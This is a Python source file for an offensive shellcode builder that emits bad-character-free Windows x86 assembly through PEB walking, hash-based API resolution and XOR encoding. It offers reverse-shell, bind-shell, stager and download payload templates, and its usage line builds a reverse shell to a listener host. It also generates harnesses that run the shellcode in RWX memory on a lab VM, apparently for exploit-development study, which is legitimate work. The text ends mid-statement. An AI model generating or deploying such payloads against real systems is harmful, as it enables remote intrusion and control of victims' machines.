"""Assembly build pipeline: manifest → generated.asm + generated_contract.md.

Usage:
    uv run emitter manifests/revshell.yaml --template reverse_shell \
        --lhost 192.168.1.116 --lport 9001 --out emitter_out/
"""
from __future__ import annotations

import argparse
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass
from datetime import datetime

from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE
from .api_emitter import emit_module_resolution
from .doc_gen import emit_full_contract_md
from .schema import Manifest, StringEntry, VariableEntry
from .schema import load as load_manifest
from .stack_alloc import StackLayout, build_layout
from .string_emitter import emit_all_strings
from .structure_emitter import emit_all_structures
from .payload_templates.base import PayloadTemplate, TemplateConfig
from Tools.strings import emit_push, to_dwords

# ---------------------------------------------------------------------------
# Framework stubs — PEB-walk and export-resolution routines.
#
# Layout is null-free: callees are placed before callers so that every
# `call` instruction uses a negative (backward) relative offset whose
# upper bytes are 0xFF, never 0x00.  The entry point uses a two-hop
# `jmp short` trampoline (1-byte offset, inherently null-free) to skip
# past the stubs and reach `main`.
# ---------------------------------------------------------------------------

def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
    """Generate Part 1a stubs (PEB walk + kernel32 find) with badchar-safe encoding.

    Must fit within 127 bytes of a jmp short from _start.
    """
    from .encode import (
        _disp_has_badchar, safe_mem_load, safe_sub_imm, safe_cmp_word,
    )
    lines: list[str] = []

    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
    lines.append("get_first_ldr_entry:")
    lines.append("    xor ecx, ecx")
    if not _disp_has_badchar(0x30, badchars):
        lines.append("    mov eax, fs:[ecx + 0x30]")
    else:
        from .encode import encode_dword
        lines.extend(encode_dword(0x30, badchars, "edx"))
        lines.append("    add edx, ecx")
        lines.append("    mov eax, fs:[edx]")
    lines.extend(safe_mem_load("eax", "eax", 0x0c, badchars, tmp="edx"))
    lines.extend(safe_mem_load("eax", "eax", 0x1c, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL
    lines.append("find_kernel32_entry:")
    lines.extend(safe_mem_load("esi", "eax", 0x30, badchars, tmp="edx"))
    lines.extend(safe_cmp_word("esi", 0, 0x004b, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 2, 0x0045, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_cmp_word("esi", 12, 0x0033, badchars, tmp="edx"))
    lines.append("    jne next")
    lines.extend(safe_mem_load("ebx", "eax", 0x18, badchars, tmp="edx"))
    lines.append("    ret")
    lines.append("")

    # next: advance to next module in list
    lines.append("next:")
    lines.extend(safe_mem_load("eax", "eax", 0x10, badchars, tmp="edx"))
    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
    lines.append("    jmp find_kernel32_entry")

    return "\n".join(lines)


def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
    """Generate Part 1b stubs (export directory/tables + save context).

    Placed after the first trampoline. find_module calls back into Part 1a.
    """
    from .encode import safe_mem_load, safe_mem_store
    lines: list[str] = []

    # find_module: entry point
    lines.append("find_module:")
    lines.append("    call get_first_ldr_entry")
    lines.append("    jmp find_kernel32_entry")
    lines.append("")

    # get_export_directory: PE header -> export directory RVA
    lines.append("get_export_directory:")
    lines.extend(safe_mem_load("eax", "ebx", 0x3c, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.extend(safe_mem_load("eax", "eax", 0x78, badchars, tmp="edx"))
    lines.append("    add eax, ebx")
    lines.append("    ret")
    lines.append("")

    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
    lines.append("get_export_tables:")
    lines.extend(safe_mem_load("ecx", "eax", 0x18, badchars, tmp="edx"))
    lines.extend(safe_mem_load("edi", "eax", 0x20, badchars, tmp="edx"))
    lines.append("    add edi, ebx")
    lines.extend(safe_mem_load("edx", "eax", 0x24, badchars, tmp="ecx"))
    lines.append("    add edx, ebx")
    lines.extend(safe_mem_load("esi", "eax", 0x1c, badchars, tmp="ecx"))
    lines.append("    add esi, ebx")
    lines.append("    ret")
    lines.append("")

    # save_export_context: store to stack frame (negative offsets from ebp)
    lines.append("save_export_context:")
    lines.extend(safe_mem_store("ebp", -0x04, "ebx", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x08, "edi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x0c, "edx", badchars, tmp="ecx"))
    lines.extend(safe_mem_store("ebp", -0x10, "esi", badchars, tmp="edx"))
    lines.extend(safe_mem_store("ebp", -0x14, "ecx", badchars, tmp="edx"))
    lines.append("    ret")

    return "\n".join(lines)


def _emit_framework_stubs_part2(badchars: set[int]) -> str:
    """Generate Part 2 stubs (hash computation + export resolution) with badchar-safe encoding."""
    from .encode import safe_mem_load, safe_mem_store, safe_ror_imm
    lines: list[str] = []

    # compute_hash: ROR-13 hash of null-terminated string at ESI
    lines.append("compute_hash:")
    lines.append("    xor eax, eax")
    lines.append("    xor edx, edx")
    lines.append("    cld")
    lines.append("")
    lines.append("hash_loop:")
    lines.append("    lodsb")
    lines.append("    test al, al")
    lines.append("    jz hash_done")
    lines.extend(safe_ror_imm("edx", 0x0d, badchars))
    lines.append("    movzx eax, al")
    lines.append("    add edx, eax")
    lines.append("    jmp hash_loop")
    lines.append("")
    lines.append("hash_done:")
    lines.append("    ret")
    lines.append("")

    # resolve_matched_export: ordinal -> function address
    lines.append("resolve_matched_export:")
    lines.extend(safe_mem_load("edx", "ebp", -0x0c, badchars, tmp="eax"))
    lines.append("    movzx eax, word ptr [edx + ecx*2]")
    lines.extend(safe_mem_load("esi", "ebp", -0x10, badchars, tmp="edx"))
    lines.append("    mov eax, [esi + eax*4]")
    lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
    lines.append("    add eax, ecx")
    lines.append("    ret")
    lines.append("")

    # resolve_export_by_hash: loop through exports comparing hashes
    lines.append("resolve_export_by_hash:")
    lines.extend(safe_mem_store("ebp", -0x18, "eax", badchars, tmp="ecx"))
    lines.append("    xor ecx, ecx")
    lines.append("")
    lines.append("find_export_loop:")
    lines.extend(safe_mem_load("edi", "ebp", -0x08, badchars, tmp="eax"))
    lines.append("    mov eax, [edi + ecx*4]")
    lines.extend(safe_mem_load("edi", "ebp", -0x04, badchars, tmp="esi"))
    lines.append("    add eax, edi")
    lines.append("    mov esi, eax")
    lines.append("    call compute_hash")
    lines.extend(safe_mem_load("eax", "ebp", -0x18, badchars, tmp="edi"))
    lines.append("    cmp edx, eax")
    lines.append("    je resolve_matched_export")
    lines.append("")
    lines.append("inc_next:")
    lines.append("    inc ecx")
    lines.extend(safe_mem_load("eax", "ebp", -0x14, badchars, tmp="edi"))
    lines.append("    cmp ecx, eax")
    lines.append("    jl find_export_loop")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Build result
# ---------------------------------------------------------------------------


@dataclass
class BuildResult:
    manifest_path: str
    asm: str
    contract_md: str
    shellcode_bytes: bytes | None = None
    hex_str: str | None = None
    py_bytes: str | None = None
    c_array: str | None = None
    test_harness: str | None = None
    debug_runner: str | None = None
    layout: StackLayout | None = None
    assembler: str | None = None
    asm_errors: list[str] | None = None
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _emit_stack_reserve(badchars: set[int]) -> list[str]:
    """Emit badchar-safe 'sub esp, 0x500' to reserve stack frame."""
    from .encode import encode_byte
    if 0x05 not in badchars:
        return [
            "    mov  ch, 0x05",
            "    sub  esp, ecx",
        ]
    lines = encode_byte(0x05, badchars, "ch")
    lines.append("    sub  esp, ecx")
    return lines


def _dll_load_block(dll: str, manifest: Manifest, layout: StackLayout) -> str:
    """Generate the LoadLibraryA block for a secondary DLL."""
    from .encode import safe_add_imm, safe_call_mem, safe_mem_store, safe_mem_load

    module_slot = layout.slot(dll)
    loadlib_off = -layout.slot("LoadLibraryA").offset
    module_off = -module_slot.offset

    push_result = emit_push(dll, badchars=manifest.badchars)
    cleanup = len(to_dwords(dll)) * 4
    bc = manifest.badchars

    lines = [
        f"; ── Loading {dll} via LoadLibraryA ──────────────────────────────────",
        "",
        push_result.asm,
        f"    push esi                    ; lpLibFileName = &{dll}",
        *safe_call_mem("ebp", loadlib_off, bc),
        *safe_mem_store("ebp", module_off, "eax", bc),
        f"    ; {dll} base",
    ]
    lines.extend(safe_add_imm("esp", cleanup, bc, tmp="ecx"))
    lines.append("    ; pop string from stack")
    lines += [
        "",
        *safe_mem_load("ebx", "ebp", module_off, bc),
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]
    return "\n".join(lines)


def _generate_test_harness(shellcode_len: int) -> str:
    """Generate a standalone Python test harness for Windows x86 shellcode."""
    return f'''\
#!/usr/bin/env python3
"""Test harness for emitter-generated shellcode.

Copy this file and shellcode.bin to the Windows lab VM, then:
  python test_harness.py

Attach WinDbg before pressing Enter. The shellcode address is printed
so you can set a breakpoint:
  bp <address>
"""
import ctypes
import sys
from pathlib import Path

SHELLCODE_LEN = {shellcode_len}


def main():
    bin_path = Path(__file__).with_name("shellcode.bin")
    if not bin_path.exists():
        print(f"[-] {{bin_path}} not found", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(bin_path.read_bytes())
    if len(shellcode) != SHELLCODE_LEN:
        print(
            f"[!] Expected {{SHELLCODE_LEN}} bytes, got {{len(shellcode)}}",
            file=sys.stderr,
        )

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Shellcode: {{len(shellcode)}} bytes")
    print(f"[+] Address:   {{ptr:#010x}}")
    print(f"[+] WinDbg:    bp {{ptr:#010x}}")
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _generate_debug_runner(asm: str) -> str:
    """Generate a self-contained Python debug script with inline assembly.

    The script assembles the shellcode with keystone on the Windows lab VM,
    allocates RWX memory, prints the address for WinDbg, pauses, then
    executes. The assembly is embedded so it can be edited directly.
    """
    asm = asm.replace(";", "#")
    escaped_asm = asm.replace("\\", "\\\\").replace('"""', '\\"\\"\\"')
    return f'''\
#!/usr/bin/env python3
"""Debug runner for emitter-generated shellcode.

Copy this file to the Windows lab VM, then:
  python debug_runner.py

The assembly source is embedded below — edit it directly to experiment.
Requires: pip install keystone-engine

Attach WinDbg before pressing Enter. The shellcode address is printed
so you can set a breakpoint:
  bp <address>
"""
import ctypes
import sys

from keystone import KS_ARCH_X86, KS_MODE_32, Ks

CODE = r"""
{escaped_asm}
"""


def strip_non_ascii(asm):
    import re as _re
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = _re.sub(r'\\bfs:\\[', '[fs:', line)
        line = line.encode("ascii", "replace").decode("ascii")
        lines.append(line)
    return "\\n".join(lines)


def main():
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    try:
        encoding, count = ks.asm(strip_non_ascii(CODE))
    except Exception as e:
        print(f"[-] Assembly failed: {{e}}", file=sys.stderr)
        sys.exit(1)

    shellcode = bytearray(encoding)

    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong,
    ]
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ]
    kernel32.CreateThread.restype = ctypes.c_void_p

    ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    if not ptr:
        print("[-] VirtualAlloc failed", file=sys.stderr)
        sys.exit(1)

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(ptr, ctypes.addressof(buf), len(shellcode))

    print(f"[+] Instructions: {{count}}")
    print(f"[+] Shellcode:    {{len(shellcode)}} bytes")
    print(f"[+] Address:      {{ptr:#010x}}")
    print(f"[+] WinDbg:       bp {{ptr:#010x}}")
    print()
    print(f'shellcode = b"' + "".join(f"\\\\x{{b:02x}}" for b in shellcode) + '"')
    print()
    input("... attach WinDbg, then press Enter to execute ...")

    ht = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not ht:
        print("[-] CreateThread failed", file=sys.stderr)
        sys.exit(1)

    kernel32.WaitForSingleObject(ht, -1)


if __name__ == "__main__":
    main()
'''


def _bytes_to_hex_str(raw: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in raw)


def _bytes_to_py(raw: bytes) -> str:
    return f'shellcode = b"{_bytes_to_hex_str(raw)}"'


def _bytes_to_c(raw: bytes) -> str:
    hex_bytes = [f"0x{b:02x}" for b in raw]
    rows = [hex_bytes[i:i + 16] for i in range(0, len(hex_bytes), 16)]
    body = "\n".join("    " + ", ".join(row) + "," for row in rows)
    return f"unsigned char shellcode[] = {{\n{body}\n}};\n// Length: {len(raw)} bytes"


def _write_text(path: pathlib.Path, data: str) -> None:
    """Write text files as UTF-8 regardless of the host locale."""
    path.write_text(data, encoding="utf-8")


def _strip_comments(asm: str) -> str:
    """Strip both # and ; comments so non-ASCII decoration never reaches the assembler."""
    lines = []
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        lines.append(line)
    return "\n".join(lines)


def _to_nasm(asm: str) -> str:
    """Convert emitter Intel syntax to nasm flat-binary syntax.

    Differences handled:
    - Prepend 'BITS 32' so nasm knows the mode
    - Strip # and ; comments (may contain non-ASCII decoration)
    - 'dword/word/byte ptr [...]' → 'dword/word/byte [...]'
    - 'fs:[...]' → '[fs:...]'  (segment register syntax)
    """
    lines = ["BITS 32"]
    for line in asm.splitlines():
        line = line.split("#")[0]
        line = line.split(";")[0]
        line = line.rstrip()
        line = re.sub(r'\bfs:\[', '[fs:', line)
        line = re.sub(r'\b(dword|word|byte)\s+ptr\b', r'\1', line, flags=re.IGNORECASE)
        lines.append(line)
    return "\n".join(lines)


def _try_assemble_keystone(asm: str) -> tuple[bytes | None, str | None]:
    """Try keystone. Returns (bytes, None) on success or (None, error_msg)."""
    try:
        import keystone
    except ImportError:
        return None, None
    try:
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        encoding, _ = ks.asm(_strip_comments(asm))
        return bytes(encoding), None
    except Exception as e:
        return None, f"keystone: {e}"


def _try_assemble_nasm(asm: str) -> tuple[bytes | None, str | None]:
    """Try nasm. Returns (bytes, None) on success or (None, error_msg)."""
    if not shutil.which("nasm"):
        return None, None
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            src = pathlib.Path(tmpdir) / "shellcode.asm"
            out = pathlib.Path(tmpdir) / "shellcode.bin"
            _write_text(src, _to_nasm(asm))
            result = subprocess.run(
                ["nasm", "-f", "bin", "-o", str(out), str(src)],
                capture_output=True,
                text=True,
            )
            if result.returncode != 0:
                return None, f"nasm: {result.stderr.strip()}"
            return out.read_bytes(), None
    except Exception as e:
        return None, f"nasm: {e}"


def _check_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Scan assembled shellcode for badchar violations. Returns error messages."""
    violations: list[str] = []
    for i, byte in enumerate(raw):
        if byte in badchars:
            ctx_start = max(0, i - 2)
            ctx_end = min(len(raw), i + 3)
            ctx = raw[ctx_start:ctx_end].hex()
            violations.append(
                f"BADCHAR 0x{byte:02x} at offset {i} (context: {ctx})"
            )
    if violations:
        summary = f"[!] {len(violations)} badchar violation(s) in {len(raw)} bytes"
        return [summary] + violations
    return []


def _try_assemble(asm: str) -> tuple[bytes, str, list[str]] | tuple[None, None, list[str]]:
    """Try keystone, then nasm. Returns (bytes, assembler_name, errors) or (None, None, errors)."""
    errors: list[str] = []
    raw, err = _try_assemble_keystone(asm)
    if raw is not None:
        return raw, "keystone", errors
    if err:
        errors.append(err)
    raw, err = _try_assemble_nasm(asm)
    if raw is not None:
        return raw, "nasm", errors
    if err:
        errors.append(err)
    return None, None, errors


def _validate_badchars(raw: bytes, badchars: set[int]) -> list[str]:
    """Return diagnostics when assembled bytes contain forbidden values."""
    hits = [(offset, byte) for offset, byte in enumerate(raw) if byte in badchars]
    if not hits:
        return []

    preview = ", ".join(f"0x{offset:04x}=0x{byte:02x}" for offset, byte in hits[:8])
    suffix = "" if len(hits) <= 8 else f" ... ({len(hits)} total)"
    return [f"assembled shellcode contains forbidden bytes: {preview}{suffix}"]


def _load_template(name: str) -> PayloadTemplate:
    """Load a payload template by short name."""
    registry = {
        "reverse_shell":  "Tools.emitter.payload_templates.reverse_shell.ReverseShellTemplate",
        "run_command":    "Tools.emitter.payload_templates.run_command.RunCommandTemplate",
        "copy_file":      "Tools.emitter.payload_templates.copy_file.CopyFileTemplate",
        "copy_then_run":  "Tools.emitter.payload_templates.copy_then_run.CopyThenRunTemplate",
        "tcp_download":   "Tools.emitter.payload_templates.tcp_download.TcpDownloadTemplate",
        "tcp_stager":     "Tools.emitter.payload_templates.tcp_stager.TcpStagerTemplate",
        "bind_shell":     "Tools.emitter.payload_templates.bind_shell.BindShellTemplate",
    }
    if name not in registry:
        raise ValueError(
            f"Unknown template: '{name}'. Available: {sorted(registry.keys())}"
        )
    module_path, cls_name = registry[name].rsplit(".", 1)
    import importlib
    mod = importlib.import_module(module_path)
    cls = getattr(mod, cls_name)
    return cls()


# ---------------------------------------------------------------------------
# CLI override precedence
# ---------------------------------------------------------------------------

# Config field name -> manifest string label(s) it can override
_CONFIG_TO_LABEL: dict[str, str] = {
    "command": "cmd",
    "src_path": "src_path",
    "dst_path": "dst_path",
}


def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manifest:
    """Apply non-None config overrides to manifest strings, then backfill
    any still-None config fields from the manifest.

    Must run before build_layout() because changed string lengths affect
    slot sizes.  Mutates config in place (backfill) and returns a new
    Manifest when any string value changed.
    """
    label_to_field: dict[str, str] = {v: k for k, v in _CONFIG_TO_LABEL.items()}

    overrides: dict[str, str] = {}
    for field_name, label in _CONFIG_TO_LABEL.items():
        val = getattr(config, field_name)
        if val is not None:
            overrides[label] = val

    changed = False
    new_strings: list[StringEntry] = []
    for entry in manifest.strings:
        if entry.label in overrides and overrides[entry.label] != entry.value:
            new_strings.append(StringEntry(
                label=entry.label,
                value=overrides[entry.label],
                method=entry.method,
                dest=entry.dest,
            ))
            changed = True
        else:
            new_strings.append(entry)

    # Backfill config from manifest for fields still None
    for entry in new_strings:
        field_name = label_to_field.get(entry.label)
        if field_name is not None and getattr(config, field_name) is None:
            setattr(config, field_name, entry.value)

    # Final fallbacks for fields with no manifest string
    if config.command is None:
        config.command = "cmd.exe"
    if config.src_path is None:
        config.src_path = "C:\\source.txt"
    if config.dst_path is None:
        config.dst_path = "C:\\dest.txt"

    if not changed:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions),
        strings=new_strings,
        variables=list(manifest.variables),
    )


# ---------------------------------------------------------------------------
# Auto-derive template requirements
# ---------------------------------------------------------------------------


def _merge_template_requirements(
    manifest: Manifest,
    template: PayloadTemplate,
    config: TemplateConfig,
) -> Manifest:
    """Probe the template to discover slot references, then return a new
    Manifest with any missing API functions auto-added.

    Classification of each probed slot name:
      - In API_DATABASE         → function (auto-add if missing)
      - In STRUCT_DATABASE      → structure (auto-derived from functions)
      - In MODULE_LOAD_ORDER    → module base (auto-derived from functions)
      - Matches a manifest string label or variable → already present
      - Otherwise               → ignored (optional probe or manifest error)

    Variables are not auto-added because the probe cannot distinguish
    required variables from optional slot lookups guarded by try/except.
    Variables must be declared in the manifest YAML.

    Non-kernel32 functions trigger automatic addition of LoadLibraryA.
    """
    probed = template.probe_slots(config)

    existing_funcs = set(manifest.functions)
    existing_vars = {v.name for v in manifest.variables}
    string_labels = {e.label for e in manifest.strings}
    dll_names = {m.dll for m in MODULE_LOAD_ORDER}

    new_funcs: list[str] = []

    for name in probed:
        if name in existing_funcs or name in existing_vars or name in string_labels:
            continue
        if name in STRUCT_DATABASE or name in dll_names:
            continue
        if name in API_DATABASE:
            new_funcs.append(name)
            existing_funcs.add(name)

    # Non-kernel32 APIs need LoadLibraryA for module loading
    all_funcs = list(manifest.functions) + new_funcs
    needs_loadlib = any(
        API_DATABASE[f].module != "kernel32.dll"
        for f in all_funcs
        if f in API_DATABASE
    )
    if needs_loadlib and "LoadLibraryA" not in existing_funcs:
        new_funcs.insert(0, "LoadLibraryA")

    if not new_funcs:
        return manifest

    return Manifest(
        badchars=manifest.badchars,
        functions=list(manifest.functions) + new_funcs,
        strings=manifest.strings,
        variables=manifest.variables,
    )


# ---------------------------------------------------------------------------
# Assembly composition
# ---------------------------------------------------------------------------


def compose_asm(
    manifest: Manifest,
    layout: StackLayout,
    manifest_path: str,
    template: PayloadTemplate | None = None,
    config: TemplateConfig | None = None,
) -> str:
    """Compose the full assembly text from all emitter components."""
    config = config or TemplateConfig()
    template_name = type(template).__name__ if template else "none"

    # Manifest push-strings whose value matches a DLL name are handled inline
    # in the module-loading block; skip them in the string section.
    dll_names = {info.dll for info in MODULE_LOAD_ORDER}
    dll_string_labels = {
        e.label for e in manifest.strings if e.value in dll_names
    }

    parts: list[str] = [
        "; AUTO-GENERATED by emitter-v1",
        f"; Manifest: {manifest_path}",
        f"; Template: {template_name}",
        f"; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "",
        "    _start:",
        "        jmp short _stub_trampoline1",
        "",
        "; ── Framework Stubs ────────────────────────────────────────────────",
        "",
        _emit_framework_stubs_part1a(config.badchars),
        "_stub_trampoline1:",
        "    jmp short _stub_trampoline2",
        "",
        _emit_framework_stubs_part1b(config.badchars),
        "_stub_trampoline2:",
        "    jmp short main",
        "",
        _emit_framework_stubs_part2(config.badchars),
        "; ── Main ───────────────────────────────────────────────────────────",
        "",
        "main:",
        "    mov  ebp, esp",
        "    xor  ecx, ecx",
        *_emit_stack_reserve(config.badchars),
        "",
        "    ; Bootstrap: find kernel32 via PEB walk",
        "    call find_module",
        "    call get_export_directory",
        "    call get_export_tables",
        "    call save_export_context",
        "",
    ]

    for mi in MODULE_LOAD_ORDER:
        module_funcs = [n for n in manifest.functions if API_DATABASE[n].module == mi.dll]
        if not module_funcs:
            continue

        if mi.load_via == "LoadLibraryA":
            if "LoadLibraryA" not in manifest.functions:
                parts.append(f"; NOTE: {mi.dll} requires LoadLibraryA in manifest")
                continue
            parts.append(_dll_load_block(mi.dll, manifest, layout))

        resolution = emit_module_resolution(manifest, layout, mi.dll)
        if resolution.strip():
            parts.append(resolution)

    parts += [
        "; ── String Construction ─────────────────────────────────────────────",
        "",
    ]
    str_asm = emit_all_strings(manifest, layout, skip_labels=dll_string_labels)
    if str_asm.strip():
        parts.append(str_asm)
    else:
        parts += ["; (no strings)", ""]

    parts += [
        "; ── Structure Initialization ────────────────────────────────────────",
        "",
    ]
    struct_asm = emit_all_structures(manifest, layout)
    if struct_asm.strip():
        parts.append(struct_asm)
    else:
        parts += ["; (no structures)", ""]

    parts += [
        "; ── Payload ─────────────────────────────────────────────────────────",
        "",
    ]
    if template is not None:
        parts.append(template.emit(layout, config))
    else:
        parts += ["; (no template — insert payload assembly here)", ""]

    parts += [
        "hang:",
        "    jmp hang",
        "",
    ]

    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def build(
    manifest_path: str,
    template_name: str | None = None,
    config: TemplateConfig | None = None,
    out_dir: str = "emitter_out",
    assemble: bool = True,
    encode: bool = False,
) -> BuildResult:
    """Run the full build pipeline. Returns a BuildResult.

    When *encode* is True and the assembled payload contains badchar
    violations, the XOR encoder is invoked automatically.  The raw
    (unencoded) shellcode is still available in *shellcode_bytes*; the
    encoded output goes into *encoded_bytes*.
    """
    from .scanner import scan
    from .xor_encoder import xor_encode

    manifest = load_manifest(manifest_path)
    config = config or TemplateConfig()
    config.badchars = manifest.badchars   # manifest is authoritative
    manifest = _apply_config_overrides(manifest, config)

    template = _load_template(template_name) if template_name else None
    if template is not None:
        manifest = _merge_template_requirements(manifest, template, config)
    layout = build_layout(manifest)
    asm = compose_asm(manifest, layout, manifest_path, template, config)

    raw: bytes | None = None
    assembler: str | None = None
    asm_errors: list[str] = []
    encoded_bytes: bytes | None = None
    encoder_report: str | None = None

    if assemble:
        raw, assembler, asm_errors = _try_assemble(asm)
        if raw:
            scan_result = scan(raw, config.badchars)
            if not scan_result.clean:
                if encode:
                    enc = xor_encode(raw, config.badchars)
                    encoder_report = enc.diagnostics
                    if enc.success:
                        encoded_bytes = enc.encoded
                    else:
                        asm_errors = (asm_errors or []) + [
                            f"[!] Encoding failed: {enc.diagnostics}"
                        ]
                else:
                    violations = _check_badchars(raw, config.badchars)
                    asm_errors = (asm_errors or []) + violations

    contract_md = emit_full_contract_md(
        manifest, layout, template, config,
        shellcode_size=len(raw) if raw else None,
    )

    return BuildResult(
        manifest_path=manifest_path,
        asm=asm,
        contract_md=contract_md,
        shellcode_bytes=raw,
        hex_str=_bytes_to_hex_str(raw) if raw else None,
        py_bytes=_bytes_to_py(raw) if raw else None,
        c_array=_bytes_to_c(raw) if raw else None,
        test_harness=_generate_test_harness(len(raw)) if raw else None,
        debug_runner=_generate_debug_runner(asm),
        layout=layout,
        assembler=assembler,
        asm_errors=asm_errors if asm_errors else None,
        encoded_bytes=encoded_bytes,
        encoder_report=encoder_report,
    )


def write_outputs(result: BuildResult, out_dir: str) -> None:
    """Write all build outputs to out_dir."""
    base = pathlib.Path(out_dir)
    (base / "asm").mkdir(parents=True, exist_ok=True)
    (base / "Documentation").mkdir(parents=True, exist_ok=True)

    _write_text(base / "asm" / "generated.asm", result.asm)
    _write_text(base / "asm" / "debug_runner.py", result.debug_runner)
    _write_text(base / "Documentation" / "contract.md", result.contract_md)

    if result.shellcode_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode.bin").write_bytes(result.shellcode_bytes)
        _write_text(base / "bin" / "shellcode.hex", result.hex_str or "")
        _write_text(base / "bin" / "shellcode.py", result.py_bytes or "")
        _write_text(base / "bin" / "shellcode.c", result.c_array or "")
        if result.test_harness:
            _write_text(base / "bin" / "test_harness.py", result.test_harness)
    else:
        for name in (
            "shellcode.bin",
            "shellcode.hex",
            "shellcode.py",
            "shellcode.c",
            "test_harness.py",
        ):
            (base / "bin" / name).unlink(missing_ok=True)

    if result.encoded_bytes:
        (base / "bin").mkdir(parents=True, exist_ok=True)
        (base / "bin" / "shellcode_encoded.bin").write_bytes(result.encoded_bytes)
        _write_text(base / "bin" / "shellcode_encoded.hex", _bytes_to_hex_str(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.py", _bytes_to_py(result.encoded_bytes) or "")
        _write_text(base / "bin" / "shellcode_encoded.c", _bytes_to_c(result.encoded_bytes) or "")

    if result.encoder_report:
        _write_text(base / "Documentation" / "encoder_report.txt", result.encoder_report)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    parser = argparse.ArgumentParser(
        description="emitter-v1: manifest → assembly + contract",
    )
    parser.add_argument("manifest", help="Path to manifest YAML file")
    parser.add_argument(
        "--template",
        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "tcp_download", "tcp_stager", "bind_shell"],
    )
    parser.add_argument("--out", default="emitter_out", help="Output directory")
    parser.add_argument("--lhost", default="127.0.0.1")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--command", default=None)
    parser.add_argument("--src", default=None)
    parser.add_argument("--dst", default=None)
    parser.add_argument("--no-assemble", action="store_true")
    parser.add_argument(
        "--encode", action="store_true",
        help="Apply XOR encoding when badchar violations are detected",
    )

    args = parser.parse_args()
    config = TemplateConfig(
        lhost=args.lhost,
        lport=args.lport,
        command=args.command,
        src_path=args.src,
        dst_path=args.dst,
    )

    result = build(
        args.manifest,
        template_name=args.template,
        config=config,
        out_dir=args.out,
        assemble=not args.no_assemble,
        encode=args.encode,
    )
    write_outputs(result, args.out)

    print(f"[+] Generated: {args.out}/asm/generated.asm")
    print(f"[+] Debug:     {args.out}/asm/debug_runner.py")
    print(f"[+] Contract:  {args.out}/Documentation/contract.md")
    if result.shellcode_bytes:
        print(f"[+] Assembler: {result.assembler}")
        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes (raw)")
        print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
        print(f"[+] Harness:   {args.out}/bin/test_harness.py")
        if result.encoded_bytes:
            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
            print(f"[+] Encoded:   {args.out}/bin/shellcode_encoded.{{bin,hex,py,c}}")
        if result.encoder_report:
            print(f"[+] Report:    {args.out}/Documentation/encoder_report.txt")
        if result.asm_errors:
